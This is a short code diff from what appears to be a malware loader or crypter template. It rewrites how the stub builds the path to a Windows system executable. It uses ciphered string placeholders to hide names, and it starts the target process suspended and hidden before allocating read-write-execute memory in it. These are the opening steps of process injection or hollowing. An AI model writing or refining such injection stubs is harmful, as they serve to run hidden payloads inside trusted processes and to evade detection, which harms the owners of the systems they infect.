@@ -26,9 +26,11 @@ int main(int argc, char** argv) {
 	TCHAR injectpath[MAX_PATH*2];
 	TCHAR args[MAX_PATH*2];
 	TCHAR* buffer;
+	TCHAR windir[MAX_PATH];
 
 	_get_pgmptr(&buffer);
-	sprintf(injectpath, cipher("#FORMAT1", #FORMAT1LENGTH), getenv(cipher("#ENV", #ENVLENGTH)), cipher("#TARGET", #TARGETLENGTH));
+	GetWindowsDirectory(windir, MAX_PATH);
+	sprintf(injectpath, cipher("#FORMAT1", #FORMAT1LENGTH), windir, cipher("#TARGET", #TARGETLENGTH));
 	sprintf(args, cipher("#FORMAT2", #FORMAT2LENGTH), injectpath, #ARGS);
 	CreateProcess(injectpath, args, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info);
 	NtAllocateVirtualMemory(p_info.hProcess, &apointer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
